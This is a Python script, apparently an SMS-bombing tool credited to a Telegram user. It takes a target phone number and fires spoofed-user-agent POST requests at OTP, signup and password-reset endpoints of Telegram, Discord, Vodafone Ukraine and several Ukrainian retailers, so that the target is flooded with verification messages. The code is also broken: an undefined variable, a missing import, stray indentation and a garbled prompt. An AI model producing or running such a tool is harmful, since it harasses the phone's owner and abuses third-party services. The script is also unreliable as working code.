import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
os.system("open-url https://t.me/Hironotori")
NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')



run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))

 try:
     print('telegram')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={"phone": "+" + NUMBER})
 except:
     print('Не доставлено "telegram"')
 try:
     print('discord')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={"phone": "+" + NUMBER})
 except:
     print('Не доставлено "discord"')
 try:
     print('megasport')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={"phone": "+" + NUMBER})
 except:
     print('Не доставлено "megasport"')
 try:
     print('xtra.tv')
     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={"phone": "+" + NUMBER})
 except:
     print('Не доставлено "xtra.tv"')
 try:
     print('xtra.tv-pass')
     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "xtra.tv-pass"')
 try:
     print('Отправлено')
     response = requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", headers=headers, json={"number": number})
 except:
     print('Не Отправлено')
 try:
     print('Отправлено')
     response = requests.post("https://zolotakoroleva.ua/api/send-otp",  headers=headers, json={"params": {"phone": "+" + number}})
 except:
     print('Не Отправлено')
 try:
     response = requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
 except:
     time.sleep(5)
